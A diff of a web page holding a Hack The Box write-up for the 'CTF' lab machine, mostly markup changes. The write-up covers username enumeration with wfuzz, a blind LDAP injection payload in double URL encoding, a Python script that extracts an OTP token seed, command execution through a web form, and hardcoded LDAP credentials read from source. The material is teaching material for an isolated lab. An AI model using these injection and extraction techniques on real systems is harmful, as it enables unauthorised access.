@@ -89,24 +89,24 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an <code class="highlighter-rouge">ldap</code> injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.122</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ctf.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/ctf/0.png" alt=""></p>
+<br><img src="/images/hackthebox/ctf/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC ctf.htb</code>
-<img src="/images/hackthebox/ctf/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC ctf.htb</code>
+<br><img src="/images/hackthebox/ctf/1.png" alt=""><br>
 <br> Only <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code> on port 22
 <br></p>
 <hr>
 
 <h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
-<p><code class="highlighter-rouge">http://ctf.htb</code>
-<img src="/images/hackthebox/ctf/2.png" alt="">
+<p><br><code class="highlighter-rouge">http://ctf.htb</code>
+<br><img src="/images/hackthebox/ctf/2.png" alt=""><br>
 <br> It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.
-<img src="/images/hackthebox/ctf/3.png" alt="">
+<br><img src="/images/hackthebox/ctf/3.png" alt=""><br>
 <br> We need a username and an <code class="highlighter-rouge">OTP</code> (one-time password). An <code class="highlighter-rouge">OTP</code> is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid <code class="highlighter-rouge">OTP</code>s or to be able to generate valid <code class="highlighter-rouge">OTP</code>s ourselves. Let’s take a look at the source code of the login page, maybe something is there :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;head&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
@@ -177,15 +177,13 @@
 
 </code></pre></div></div>
 <p><br> These comments look interesting :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;
-      &lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span>
+      <span class="c">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span>
 </code></pre></div></div>
 <p><br> So now we know that they are using a token to generate the <code class="highlighter-rouge">OTP</code>s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the <code class="highlighter-rouge">OTP</code> thing again. 
 <br> I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :
-<img src="/images/hackthebox/ctf/4.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ctf/5.png" alt="">
+<br><img src="/images/hackthebox/ctf/4.png" alt=""><br>
+<br><img src="/images/hackthebox/ctf/5.png" alt=""><br>
 <br> Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a <code class="highlighter-rouge">200 OK</code> response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like <code class="highlighter-rouge">404</code> for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used <code class="highlighter-rouge">wfuzz</code> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">multiplesources-users-fabian-fingerle.de.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c -u http://ctf.htb/login.php -X POST -d "inputUsername=FUZZ&amp;inputOTP=0000" -w ./multiplesources-users-fabian-fingerle.de.txt 
 
@@ -254,45 +252,42 @@ ID   Response   Lines      Word         Chars          Payload
 Finishing pending requests...
 </code></pre></div></div>
 <p><br>  It worked and I didn’t get banned, after some time I got a result which was <code class="highlighter-rouge">ldapuser</code>, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried <code class="highlighter-rouge">ldapuser</code> to see what’s the other message :
-<img src="/images/hackthebox/ctf/6.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ctf/7.png" alt="">
+<br><img src="/images/hackthebox/ctf/6.png" alt=""><br>
+<br><img src="/images/hackthebox/ctf/7.png" alt=""><br>
 <br> It was “Cannot login”
 <br> Then I tried <code class="highlighter-rouge">!@#%^&amp;*</code> and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an <code class="highlighter-rouge">ldap</code> query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an <code class="highlighter-rouge">ldap</code> attribute. With the injection we have we can extract the token and use it to generate valid <code class="highlighter-rouge">OTP</code>s. But because the injection is blind it will be kinda tricky to extract the token.
 <br></p>
 <hr>
 
 <h2 id="ldap-injection">LDAP Injection</h2>
-<p><br> As I said, it’s a blind injection which means that we won’t get any results. But a payload like this :<code class="highlighter-rouge">*)(uid=*))(|(uid=*</code>  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :
+<p><br> As I said, it’s a blind injection which means that we won’t get any results. But a payload like this : <code class="highlighter-rouge">*)(uid=*))(|(uid=*</code>  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :
 <br> Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /login.php HTTP/1.1
-Host: ctf.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://ctf.htb/login.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 190
-Cookie: PHPSESSID=sqmpanb3d1uui0pf4uafubv010
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ctf.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ctf.htb/login.php</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">190</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=sqmpanb3d1uui0pf4uafubv010</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;inputOTP=0000
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-HTTP/1.1 200 OK
-Date: Fri, 19 Jul 2019 17:58:29 GMT
-Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
-X-Powered-By: PHP/5.4.16
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
-Pragma: no-cache
-Content-Length: 2822
-Connection: close
-Content-Type: text/html; charset=UTF-8
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 19 Jul 2019 17:58:29 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.4.16</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2822</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
 
 <span class="cp">&lt;!doctype html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
@@ -326,7 +321,7 @@ Content-Type: text/html; charset=UTF-8
 <p><br> Then I wrote a <code class="highlighter-rouge">while</code> loop to keep calling <code class="highlighter-rouge">exploit()</code> as long as <code class="highlighter-rouge">len(token)</code> is not 81 
 <br>
 <br> <code class="highlighter-rouge">extract_token.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
@@ -365,58 +360,58 @@ Content-Type: text/html; charset=UTF-8
 	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Token : "</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>
-<img src="/images/hackthebox/ctf/8.gif" alt="">
+<br><img src="/images/hackthebox/ctf/8.gif" alt=""><br>
 <br> It took some minutes to finish and now we have the token :
-<img src="/images/hackthebox/ctf/9.png" alt=""></p>
+<br><img src="/images/hackthebox/ctf/9.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>285449490011357156531651545652335570713167411445727140604172141456711102716717000
 </code></pre></div></div>
 <p><br> I installed <a href="https://github.com/cernekee/stoken" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">stoken</code></a> (<code class="highlighter-rouge">apt-get install stoken</code>), Then I imported the token :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
 </code></pre></div></div>
-<p><img src="/images/hackthebox/ctf/10.png" alt=""> 
+<p><br><img src="/images/hackthebox/ctf/10.png" alt=""><br> 
 <br> I didn’t type any password I left it blank. We can either use the <code class="highlighter-rouge">cli</code> or the <code class="highlighter-rouge">gui</code>, for the <code class="highlighter-rouge">cli</code> you have to start <code class="highlighter-rouge">stoken</code> and enter the pin then you will get the <code class="highlighter-rouge">OTP</code>, and for another <code class="highlighter-rouge">OTP</code> you’ll need to start <code class="highlighter-rouge">stoken</code> again.
-<img src="/images/hackthebox/ctf/11.png" alt="">
+<br><img src="/images/hackthebox/ctf/11.png" alt=""><br>
 <br> So I just used the <code class="highlighter-rouge">gui</code> as it’s better :
-<img src="/images/hackthebox/ctf/12.png" alt=""></p>
+<br><img src="/images/hackthebox/ctf/12.png" alt=""><br></p>
 <hr>
 
 <h2 id="rce-user-flag">RCE, User Flag</h2>
 <p><br> Let’s login and see what’s there :
-<img src="/images/hackthebox/ctf/13.png" alt="">
+<br><img src="/images/hackthebox/ctf/13.png" alt=""><br>
 <br> <code class="highlighter-rouge">%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a</code> is <code class="highlighter-rouge">*)(uid=*))(|(uid=*</code> url-encoded.
 <br> It redirected me to <code class="highlighter-rouge">/page.php</code> which I can use to execute commands :
-<img src="/images/hackthebox/ctf/14.png" alt="">
+<br><img src="/images/hackthebox/ctf/14.png" alt=""><br>
 <br> I tried <code class="highlighter-rouge">whoami</code> and it worked fine:
-<img src="/images/hackthebox/ctf/15.png" alt="">
+<br><img src="/images/hackthebox/ctf/15.png" alt=""><br>
 <br> I switched to burp to make things easier, I wanted to read <code class="highlighter-rouge">/etc/passwd</code> to know the users :
 <br> Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /page.php HTTP/1.1
-Host: ctf.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://ctf.htb/page.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 42
-Cookie: PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/page.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ctf.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ctf.htb/page.php</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">42</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 inputCmd=cat /etc/passwd&amp;inputOTP=52447058
 
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Date: Fri, 19 Jul 2019 21:58:13 GMT
-Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
-X-Powered-By: PHP/5.4.16
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
-Pragma: no-cache
-Content-Length: 4005
-Connection: close
-Content-Type: text/html; charset=UTF-8
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 19 Jul 2019 21:58:13 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.4.16</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4005</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
 
 <span class="cp">&lt;!doctype html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
@@ -481,79 +476,79 @@ drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
 drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
 </code></pre></div></div>
 <p><br> I started looking for any hardcoded credentials in the <code class="highlighter-rouge">php</code> files, in <code class="highlighter-rouge">login.php</code> I found credentials for <code class="highlighter-rouge">ldapuser</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=cat login.php&amp;inputOTP=04181897
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=cat login.php<span class="err">&amp;</span>inputOTP=04181897
 
-&lt;?php
-session_start();
-$strErrorMsg="";
+<span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$strErrorMsg</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
 
-$username = 'ldapuser';
-$password = 'e398e27d5c4ad45086fe431120932a01';
+<span class="nv">$username</span> <span class="o">=</span> <span class="s1">'ldapuser'</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s1">'e398e27d5c4ad45086fe431120932a01'</span><span class="p">;</span>
 
-$basedn = 'dc=ctf,dc=htb';
-$usersdn = 'cn=users';
+<span class="nv">$basedn</span> <span class="o">=</span> <span class="s1">'dc=ctf,dc=htb'</span><span class="p">;</span>
+<span class="nv">$usersdn</span> <span class="o">=</span> <span class="s1">'cn=users'</span><span class="p">;</span>
 
-// This code uses the START_TLS command
+<span class="c1">// This code uses the START_TLS command
+</span>
+<span class="nv">$ldaphost</span> <span class="o">=</span> <span class="s2">"ldap://ctf.htb"</span><span class="p">;</span>
+<span class="nv">$ldapUsername</span>  <span class="o">=</span> <span class="s2">"cn=</span><span class="nv">$username</span><span class="s2">"</span><span class="p">;</span>
 
-$ldaphost = "ldap://ctf.htb";
-$ldapUsername  = "cn=$username";
+<span class="nv">$ds</span> <span class="o">=</span> <span class="nb">ldap_connect</span><span class="p">(</span><span class="nv">$ldaphost</span><span class="p">);</span>
+<span class="nv">$dn</span> <span class="o">=</span> <span class="s2">"uid=ldapuser,ou=People,dc=ctf,dc=htb"</span><span class="p">;</span>
 
-$ds = ldap_connect($ldaphost);
-$dn = "uid=ldapuser,ou=People,dc=ctf,dc=htb";
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="c1">//var_dump($_POST);
+</span>    <span class="nv">$username1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'inputUsername'</span><span class="p">];</span>
+    <span class="nv">$OPT1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'inputOTP'</span><span class="p">];</span>
 
-if (!empty($_POST))
-{
-    //var_dump($_POST);
-    $username1 = $_POST['inputUsername'];
-    $OPT1 = $_POST['inputOTP'];
+    <span class="nv">$regex</span><span class="o">=</span><span class="s1">'/[()*&amp;|!=&gt;&lt;~]/'</span><span class="p">;</span>
 
-    $regex='/[()*&amp;|!=&gt;&lt;~]/';
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$username1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$username2</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$username1</span><span class="p">);</span>
 
-    if (!preg_match($regex, $username1)) {
-        $username2 = urldecode($username1);
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nx">LDAP_OPT_PROTOCOL_VERSION</span><span class="p">,</span> <span class="mi">3</span><span class="p">)){</span>
+            <span class="k">print</span> <span class="s2">"Could not set LDAPv3</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ldap_start_tls</span><span class="p">(</span><span class="nv">$ds</span><span class="p">))</span> <span class="p">{</span>
+           <span class="k">print</span> <span class="s2">"Could not start secure TLS connection"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="c1">// now we need to bind to the ldap server
+</span>            <span class="nv">$bth</span> <span class="o">=</span> <span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nv">$dn</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">Could not connect to LDAP server</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">);</span>
 
-        if(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3)){
-            print "Could not set LDAPv3\r\n";
-        }
-        else if (!ldap_start_tls($ds)) {
-           print "Could not start secure TLS connection";
-        }
-        else {
-            // now we need to bind to the ldap server
-            $bth = ldap_bind($ds, $dn, $password) or die("\r\nCould not connect to LDAP server\r\n");
+            <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">"(&amp;(objectClass=inetOrgPerson)(uid=</span><span class="nv">$username2</span><span class="s2">))"</span><span class="p">;</span>
+            <span class="c1">// fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
+</span>            <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">"(&amp;(&amp;(objectClass=inetOrgPerson)(uid=</span><span class="nv">$username2</span><span class="s2">))(pager=*))"</span><span class="p">;</span>
+            <span class="c1">//echo $filter.PHP_EOL;
+</span>            <span class="k">if</span> <span class="p">(</span><span class="nv">$search</span><span class="o">=@</span><span class="nb">ldap_search</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nv">$basedn</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$info</span> <span class="o">=</span> <span class="nb">ldap_get_entries</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
 
-            $filter = "(&amp;(objectClass=inetOrgPerson)(uid=$username2))";
-            // fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
-            $filter = "(&amp;(&amp;(objectClass=inetOrgPerson)(uid=$username2))(pager=*))";
-            //echo $filter.PHP_EOL;
-            if ($search=@ldap_search($ds, $basedn, $filter)) {
-                $info = ldap_get_entries($ds, $search);
-
-                if($info["count"] &gt; 0) {
-                    $token_string = $info[0]['pager'][0];
-                    //echo $token_string;
-                    $token = exec("/usr/bin/stoken --token=$token_string --pin=0000");
-                    if($token == $OPT1) {
-                        $strErrorMsg = "Login ok";
-                        $_SESSION['username'] = $username1;
-                        header ('Location: /page.php');
-                    }
-                    else {
-                        $strErrorMsg = "Cannot login";
-                    }
-                }
-                else {
-                    $strErrorMsg = "User $username1 not found";
-                }
-            }
-        }
-    }
-}
-?&gt;
+                <span class="k">if</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"count"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$token_string</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'pager'</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
+                    <span class="c1">//echo $token_string;
+</span>                    <span class="nv">$token</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/usr/bin/stoken --token=</span><span class="nv">$token_string</span><span class="s2"> --pin=0000"</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="nv">$token</span> <span class="o">==</span> <span class="nv">$OPT1</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$strErrorMsg</span> <span class="o">=</span> <span class="s2">"Login ok"</span><span class="p">;</span>
+                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$username1</span><span class="p">;</span>
+                        <span class="nb">header</span> <span class="p">(</span><span class="s1">'Location: /page.php'</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">else</span> <span class="p">{</span>
+                        <span class="nv">$strErrorMsg</span> <span class="o">=</span> <span class="s2">"Cannot login"</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$strErrorMsg</span> <span class="o">=</span> <span class="s2">"User </span><span class="nv">$username1</span><span class="s2"> not found"</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 <p><br> ` ldapuser : e398e27d5c4ad45086fe431120932a01<code class="highlighter-rouge">
 &lt;br&gt; </code>ssh` :
-<img src="/images/hackthebox/ctf/16.png" alt="">
+<br><img src="/images/hackthebox/ctf/16.png" alt=""><br>
 <br> We owned user.
 <br></p>
 <hr>
@@ -607,31 +602,31 @@ dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
 [ldapuser@ctf backup]$ 
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">honeypot.sh</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf backup]$ cat honeypot.sh 
-# get banned ips from fail2ban jails and update banned.txt
-# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
-/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u &gt; /var/www/html/banned.txt
-# awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>ldapuser@ctf backup]<span class="nv">$ </span><span class="nb">cat </span>honeypot.sh 
+<span class="c"># get banned ips from fail2ban jails and update banned.txt</span>
+<span class="c"># banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)</span>
+/usr/sbin/ipset list | <span class="nb">grep </span>fail2ban <span class="nt">-A</span> 7 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'</span> | sort <span class="nt">-u</span> <span class="o">&gt;</span> /var/www/html/banned.txt
+<span class="c"># awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt</span>
 
-# some vars in order to be sure that backups are protected
-now=$(date +"%s")
-filename="backup.$now"
-pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')
+<span class="c"># some vars in order to be sure that backups are protected</span>
+<span class="nv">now</span><span class="o">=</span><span class="k">$(</span>date +<span class="s2">"%s"</span><span class="k">)</span>
+<span class="nv">filename</span><span class="o">=</span><span class="s2">"backup.</span><span class="nv">$now</span><span class="s2">"</span>
+<span class="nv">pass</span><span class="o">=</span><span class="k">$(</span>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> 0xEA31 <span class="nt">-in</span> /root/root.txt | md5sum | awk <span class="s1">'{print $1}'</span><span class="k">)</span>
 
-# keep only last 10 backups
-cd /backup
-ls -1t *.zip | tail -n +11 | xargs rm -f
+<span class="c"># keep only last 10 backups</span>
+<span class="nb">cd</span> /backup
